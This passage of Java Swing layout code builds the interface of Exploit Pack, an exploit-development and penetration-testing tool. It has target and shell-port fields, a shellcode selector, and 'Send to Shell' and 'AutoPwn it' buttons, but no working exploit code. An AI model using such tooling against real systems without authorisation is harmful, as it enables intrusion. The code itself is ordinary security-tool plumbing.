        jTextFieldTargetP.setText("8080");
        jTextFieldTargetP.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldTargetPMouseClicked(evt);
            }
        });

        jTextFieldTargetPath.setText("/path/example");

        jLabel5.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/shellcode.png"))); // NOI18N
        jLabel5.setText("Shellcode:");

        jLabel6.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/options.png"))); // NOI18N
        jLabel6.setText("Arguments:");
        jLabel6.setToolTipText("");

        jTextFieldExtraOptions.setText("touch /tmp/ep");
        jTextFieldExtraOptions.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldExtraOptionsMouseClicked(evt);
            }
        });
        jTextFieldExtraOptions.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldExtraOptionsActionPerformed(evt);
            }
        });

        jTextFieldshellPort.setText("4444");

        jLabel7.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/localport.png"))); // NOI18N
        jLabel7.setText("Shell data:");

        jLabel8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/home.png"))); // NOI18N
        jLabel8.setText("Hostname:");

        jComboBoxShellcode.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Shellcode.." }));

        jTextFieldLocalHost.setText("My Computer");

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel2)
                    .addComponent(jLabel3)
                    .addComponent(jLabel4)
                    .addComponent(jLabel1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jTextFieldTargetP, javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jTextFieldTargetH, javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jTextFieldProjectN, javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jTextFieldTargetPath, javax.swing.GroupLayout.DEFAULT_SIZE, 177, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 24, Short.MAX_VALUE)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jLabel6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jLabel5)
                    .addComponent(jLabel7)
                    .addComponent(jLabel8, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jTextFieldLocalHost)
                    .addComponent(jTextFieldExtraOptions)
                    .addComponent(jComboBoxShellcode, 0, 172, Short.MAX_VALUE)
                    .addComponent(jTextFieldshellPort))
                .addContainerGap())
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel3Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addComponent(jTextFieldLocalHost, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(12, 12, 12)
                        .addComponent(jTextFieldshellPort, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jTextFieldExtraOptions, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jComboBoxShellcode, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel3Layout.createSequentialGroup()
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jTextFieldProjectN, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel1)
                            .addComponent(jLabel8))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jTextFieldTargetH, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel2)
                            .addComponent(jLabel7))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jTextFieldTargetP, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel3)
                            .addComponent(jLabel6))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jTextFieldTargetPath, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel4)
                            .addComponent(jLabel5))))
                .addContainerGap())
        );

        jPanel6.setBackground(java.awt.Color.white);

        jToolBar2.setFloatable(false);
        jToolBar2.setRollover(true);

        jButton16.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/openexploit.png"))); // NOI18N
        jButton16.setText("New Module");
        jButton16.setFocusable(false);
        jButton16.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton16.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton16ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton16);
        jToolBar2.add(jSeparator22);

        jButton27.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/newexploit.png"))); // NOI18N
        jButton27.setText("Edit");
        jButton27.setFocusable(false);
        jButton27.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton27.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton27ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton27);
        jToolBar2.add(jSeparator46);

        jButton17.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/saveexploit.png"))); // NOI18N
        jButton17.setText("Save it");
        jButton17.setFocusable(false);
        jButton17.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton17.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton17ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton17);
        jToolBar2.add(jSeparator23);

        jButton20.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1418843055_bug.png"))); // NOI18N
        jButton20.setText("Send to Shell");
        jButton20.setToolTipText("");
        jButton20.setFocusable(false);
        jButton20.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton20.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton20ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton20);
        jToolBar2.add(jSeparator24);

        jButton19.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/exploitpreferences.png"))); // NOI18N
        jButton19.setText("Preferences");
        jButton19.setFocusable(false);
        jButton19.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton19.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton19ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton19);
        jToolBar2.add(jSeparator25);

        jButton18.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/exploithelp.png"))); // NOI18N
        jButton18.setText("Submit & Share");
        jButton18.setFocusable(false);
        jButton18.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton18.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton18ActionPerformed(evt);
            }
        });
        jToolBar2.add(jButton18);

        jPanelEditor.setBackground(java.awt.Color.white);
        jPanelEditor.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true));
        jPanelEditor.setAutoscrolls(true);
        jPanelEditor.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        jPanelEditor.setLayout(new java.awt.BorderLayout());

        javax.swing.GroupLayout jPanel6Layout = new javax.swing.GroupLayout(jPanel6);
        jPanel6.setLayout(jPanel6Layout);
        jPanel6Layout.setHorizontalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addGroup(jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jToolBar2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jPanelEditor, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel6Layout.setVerticalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addComponent(jToolBar2, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanelEditor, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel18.setBackground(java.awt.Color.white);
        jPanel18.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Debug console", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.TOP));

        jButtonShell.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/arrow-right-16.png"))); // NOI18N
        jButtonShell.setText("Run");
        jButtonShell.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonShellActionPerformed(evt);
            }
        });

        jTextFieldShellinput.setText("Type your commands here..");
        jTextFieldShellinput.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldShellinputMouseClicked(evt);
            }
        });
        jTextFieldShellinput.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextFieldShellinputKeyPressed(evt);
            }
        });

        jTextAreaShellcode.setEditable(false);
        jTextAreaShellcode.setBackground(new java.awt.Color(1, 1, 1));
        jTextAreaShellcode.setColumns(20);
        jTextAreaShellcode.setFont(new java.awt.Font("Liberation Mono", 0, 12)); // NOI18N
        jTextAreaShellcode.setForeground(new java.awt.Color(254, 254, 254));
        jTextAreaShellcode.setRows(5);
        jTextAreaShellcode.setText("WARNING: There is no warranty for this piece of software.\n\nExploit Pack is a learning platform for exploit development in\ncontrolled environments, please DO NOT misuse this tool.\n\nThe programs or scripts included with Exploit Pack are\nfree software; the exact distribution terms for each one\nare described in the individual files.\n\nKeep Exploit Pack up-to-date, check: https://github.com/juansacco/exploitpack\nfor the more recent version of this software.\n\n\"Whitout followers, it cannot spread\" - Star Trek, Season 3, Episode 5\n\nReady to start? Type ? for help.\n\n\n");
        jScrollPane2.setViewportView(jTextAreaShellcode);

        jButtonShell1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/edit-clear.png"))); // NOI18N
        jButtonShell1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButtonShell1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel18Layout = new javax.swing.GroupLayout(jPanel18);
        jPanel18.setLayout(jPanel18Layout);
        jPanel18Layout.setHorizontalGroup(
            jPanel18Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel18Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel18Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane2)
                    .addGroup(jPanel18Layout.createSequentialGroup()
                        .addComponent(jTextFieldShellinput)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButtonShell1, javax.swing.GroupLayout.PREFERRED_SIZE, 26, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(2, 2, 2)
                        .addComponent(jButtonShell)))
                .addContainerGap())
        );
        jPanel18Layout.setVerticalGroup(
            jPanel18Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel18Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 449, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel18Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(jPanel18Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(jButtonShell)
                        .addComponent(jTextFieldShellinput, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jButtonShell1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );

        javax.swing.GroupLayout jPanelDashboardLayout = new javax.swing.GroupLayout(jPanelDashboard);
        jPanelDashboard.setLayout(jPanelDashboardLayout);
        jPanelDashboardLayout.setHorizontalGroup(
            jPanelDashboardLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanelDashboardLayout.createSequentialGroup()
                .addGroup(jPanelDashboardLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jPanel18, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanelDashboardLayout.setVerticalGroup(
            jPanelDashboardLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanelDashboardLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanelDashboardLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(jPanelDashboardLayout.createSequentialGroup()
                        .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanel18, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addComponent(jPanel6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );

        jTabbedPane.addTab("Home", jPanelDashboard);

        jPanel16.setBackground(java.awt.Color.white);

        jPanel24.setBackground(java.awt.Color.white);

        jToolBar3.setBackground(java.awt.Color.white);
        jToolBar3.setBorder(null);
        jToolBar3.setFloatable(false);
        jToolBar3.setRollover(true);

        jLabel29.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/computer.png"))); // NOI18N
        jLabel29.setText("Name:");
        jToolBar3.add(jLabel29);

        jLabelTargetName.setText("Selection");
        jToolBar3.add(jLabelTargetName);
        jToolBar3.add(jSeparator41);

        jLabel33.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/shellcode.png"))); // NOI18N
        jLabel33.setText("OS Platform:");
        jToolBar3.add(jLabel33);

        jLabelPlatform.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/buglittle.png"))); // NOI18N
        jToolBar3.add(jLabelPlatform);
        jToolBar3.add(jSeparator39);

        jCheckBox2.setText("Owned");
        jToolBar3.add(jCheckBox2);
        jToolBar3.add(jSeparator45);

        jButton24.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/buglittle.png"))); // NOI18N
        jButton24.setText("Check for Exploits");
        jButton24.setFocusable(false);
        jButton24.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton24.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton24ActionPerformed(evt);
            }
        });
        jToolBar3.add(jButton24);
        jToolBar3.add(jSeparator37);

        jButton22.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/90-16.png"))); // NOI18N
        jButton22.setText("Delete");
        jButton22.setFocusable(false);
        jButton22.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton22.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton22ActionPerformed(evt);
            }
        });
        jToolBar3.add(jButton22);
        jToolBar3.add(jSeparator44);

        jButton23.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/robotauto.png"))); // NOI18N
        jButton23.setText("AutoPwn it");
        jButton23.setFocusable(false);
        jButton23.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        jButton23.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton23ActionPerformed(evt);
            }
        });
        jToolBar3.add(jButton23);
        jToolBar3.add(jSeparator40);

        jButton15.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/1316134049_table_save.png"))); // NOI18N
        jButton15.setText("Save");
        jButton15.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton15ActionPerformed(evt);
            }
        });
        jToolBar3.add(jButton15);
        jToolBar3.add(jSeparator43);

        javax.swing.GroupLayout jPanel24Layout = new javax.swing.GroupLayout(jPanel24);
        jPanel24.setLayout(jPanel24Layout);
        jPanel24Layout.setHorizontalGroup(
            jPanel24Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel24Layout.createSequentialGroup()
                .addComponent(jToolBar3, javax.swing.GroupLayout.DEFAULT_SIZE, 1334, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel24Layout.setVerticalGroup(
            jPanel24Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel24Layout.createSequentialGroup()
                .addComponent(jToolBar3, javax.swing.GroupLayout.PREFERRED_SIZE, 25, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 3, Short.MAX_VALUE))
        );

        jPanelTargets.setLayout(new java.awt.BorderLayout());

        javax.swing.GroupLayout jPanel16Layout = new javax.swing.GroupLayout(jPanel16);
        jPanel16.setLayout(jPanel16Layout);
        jPanel16Layout.setHorizontalGroup(
            jPanel16Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel16Layout.createSequentialGroup()
                .addGroup(jPanel16Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel24, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel16Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jPanelTargets, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                .addContainerGap())
        );
        jPanel16Layout.setVerticalGroup(
            jPanel16Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel16Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel24, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanelTargets, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        jTabbedPane.addTab("My Pentest", jPanel16);

        jPanel7.setBackground(java.awt.Color.white);

        jPanel9.setBackground(java.awt.Color.white);

        jPanel11.setBackground(java.awt.Color.white);
        jPanel11.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Report properties"));

        jLabel9.setText("Report name:");

        jTextFieldPentestName.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldPentestNameMouseClicked(evt);
            }
        });
        jTextFieldPentestName.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jTextFieldPentestNameActionPerformed(evt);
            }
        });

        jLabel16.setText("Subtitle:");

        jTextFieldPentestSubTittle.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jTextFieldPentestSubTittleMouseClicked(evt);
            }
        });

        jLabel17.setText("Image logo:");

        jTextFieldPentestImage.setText("/image/path");

        jButton11.setIcon(new javax.swing.ImageIcon(getClass().getResource("/exploitpack/resources/open.png"))); // NOI18N
        jButton11.setText("Select");
        jButton11.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton11ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel11Layout = new javax.swing.GroupLayout(jPanel11);
        jPanel11.setLayout(jPanel11Layout);
        jPanel11Layout.setHorizontalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel11Layout.createSequentialGroup()
                .addGap(8, 8, 8)
                .addComponent(jLabel9, javax.swing.GroupLayout.PREFERRED_SIZE, 87, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextFieldPentestName, javax.swing.GroupLayout.PREFERRED_SIZE, 241, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(jLabel16)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextFieldPentestSubTittle)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel17)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextFieldPentestImage, javax.swing.GroupLayout.PREFERRED_SIZE, 216, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jButton11)
                .addContainerGap())
        );
        jPanel11Layout.setVerticalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel11Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel9)
                    .addComponent(jTextFieldPentestName, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel16)
                    .addComponent(jTextFieldPentestSubTittle, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel17)
                    .addComponent(jTextFieldPentestImage, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton11))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel17.setBackground(java.awt.Color.white);
        jPanel17.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Recommendations ( Footer )"));

        jTextAreaPentestFooter.setColumns(20);
        jTextAreaPentestFooter.setLineWrap(true);
        jTextAreaPentestFooter.setRows(5);
        jScrollPane6.setViewportView(jTextAreaPentestFooter);

        javax.swing.GroupLayout jPanel17Layout = new javax.swing.GroupLayout(jPanel17);
        jPanel17.setLayout(jPanel17Layout);
        jPanel17Layout.setHorizontalGroup(
            jPanel17Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel17Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane6, javax.swing.GroupLayout.DEFAULT_SIZE, 497, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel17Layout.setVerticalGroup(
            jPanel17Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel17Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane6, javax.swing.GroupLayout.DEFAULT_SIZE, 405, Short.MAX_VALUE)
                .addContainerGap())
        );

        jPanel13.setBackground(java.awt.Color.white);
        jPanel13.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 0, 0), 1, true), "Custom finding: 1"));

        jComboBoxCustom1.setModel(new javax.swing.DefaultComboBoxModel(new String[] { "Low", "Normal", "Higher", "Critical" }));

        jLabel18.setText("Name:");

        jTextFieldCustom1.setText("vulnerability name..");

        jLabel19.setText("Risk level:");

        jLabel20.setText("Description:");

        jTextFieldCustomDesc1.setText("The webserver is prone to stack buffer overflow by abusing of CVE: 123");

        javax.swing.GroupLayout jPanel13Layout = new javax.swing.GroupLayout(jPanel13);
        jPanel13.setLayout(jPanel13Layout);
        jPanel13Layout.setHorizontalGroup(
            jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel13Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel18)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jTextFieldCustom1, javax.swing.GroupLayout.PREFERRED_SIZE, 235, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel19)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jComboBoxCustom1, javax.swing.GroupLayout.PREFERRED_SIZE, 84, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel20)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextFieldCustomDesc1, javax.swing.GroupLayout.PREFERRED_SIZE, 1, Short.MAX_VALUE)
                .addContainerGap())
        );
        jPanel13Layout.setVerticalGroup(
            jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel13Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel13Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
